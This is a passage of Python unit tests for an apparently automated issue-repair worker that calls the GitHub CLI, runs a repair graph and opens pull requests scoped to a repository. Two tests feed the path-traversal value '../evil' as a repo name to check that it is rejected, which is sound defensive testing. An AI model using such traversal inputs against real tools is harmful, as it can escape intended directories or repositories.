            "repo": "boomtick",
            "target_files": [],
            "verification_cmd": "",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": False,
            "tests_passed": False,
            "worktree_dir": "",
            "branch_name": "",
        }

        updates = rw.parse_issue_node(state)
        self.assertEqual(updates["verification_cmd"], "pytest")
        mock_run.assert_called_once_with(
            ["gh", "issue", "view", "42", "--json", "body",
             "--repo", "arii/boomtick"],
            stdout=rw.subprocess.PIPE,
            stderr=rw.subprocess.PIPE,
            text=True,
        )

    @patch("subprocess.run")
    def test_create_pr_node_scopes_repo(self, mock_run):
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "https://github.com/arii/boomtick/pull/1"
        mock_run.return_value = mock_proc

        state: rw.AgentState = {
            "issue_number": 7,
            "issue_body": "",
            "repo": "arii/boomtick",
            "target_files": ["foo.py"],
            "verification_cmd": "pytest",
            "file_contents": {},
            "current_errors": "",
            "retry_count": 0,
            "ast_valid": True,
            "tests_passed": True,
            "worktree_dir": "/tmp/worktree",
            "branch_name": "repair/issue-7",
        }

        self.assertEqual(rw.create_pr_node(state), {})
        pr_call = mock_run.call_args_list[-1]
        self.assertEqual(pr_call.args[0][-2:], ["--repo", "arii/boomtick"])
        self.assertEqual(pr_call.kwargs["cwd"], "/tmp/worktree")

    def test_run_repair_routes_repo_into_state(self):
        graph = MagicMock()
        graph.invoke.return_value = {"tests_passed": True}
        with patch("core_cli.repair_worker.build_repair_graph",
                   return_value=graph):
            with patch("core_cli.repair_worker.preflight_ollama",
                       return_value=None):
                self.assertTrue(rw.run_repair(issue_number=99,
                                              repo="boomtick"))
                self.assertTrue(rw.run_repair(issue_number=99))
        first, second = graph.invoke.call_args_list
        self.assertEqual(first.args[0]["repo"], "arii/boomtick")
        self.assertEqual(second.args[0]["repo"], "arii/remote-server")

    def test_run_repair_rejects_bad_repo(self):
        with self.assertRaises(ValueError):
            rw.run_repair(issue_number=99, repo="../evil")

    def test_main_passes_repo(self):
        with patch("core_cli.repair_worker.run_repair",
                   return_value=True) as m:
            with self.assertRaises(SystemExit) as ctx:
                rw.main(["--issue", "7", "--repo", "boomtick"])
        self.assertEqual(ctx.exception.code, 0)
        m.assert_called_once_with(issue_number=7, issue_body=None,
                                  repo="arii/boomtick")

    def test_main_defaults_repo(self):
        with patch("core_cli.repair_worker.run_repair",
                   return_value=False) as m:
            with self.assertRaises(SystemExit) as ctx:
                rw.main(["--issue", "7"])
        self.assertEqual(ctx.exception.code, 1)
        m.assert_called_once_with(issue_number=7, issue_body=None,
                                  repo="arii/remote-server")

    def test_main_rejects_bad_repo(self):
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            with self.assertRaises(SystemExit) as ctx:
                rw.main(["--issue", "7", "--repo", "../evil"])
        self.assertEqual(ctx.exception.code, 2)


if __name__ == "__main__":
    unittest.main()
